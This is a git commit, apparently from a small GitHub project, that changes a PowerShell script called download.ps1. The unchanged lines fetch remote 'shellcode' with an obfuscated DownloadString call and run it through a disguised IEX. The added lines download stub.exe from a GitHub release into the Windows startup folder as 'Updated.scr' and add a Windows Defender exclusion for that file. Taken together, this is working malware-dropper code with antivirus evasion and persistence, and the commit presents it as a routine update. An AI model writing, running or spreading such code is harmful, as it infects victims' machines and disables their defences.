7a5c182e4db01a798cd2557b6c6a7533874d7ec5
43a1723 <hai1723notgay@gmail.com>
2024-09-23 11:45:37 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -51,4 +51,13 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/sh
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
+$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
+$output = "$startupfolder\Updated.scr"
+Add-MpPreference -ExclusionPath $output
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+}
+
 
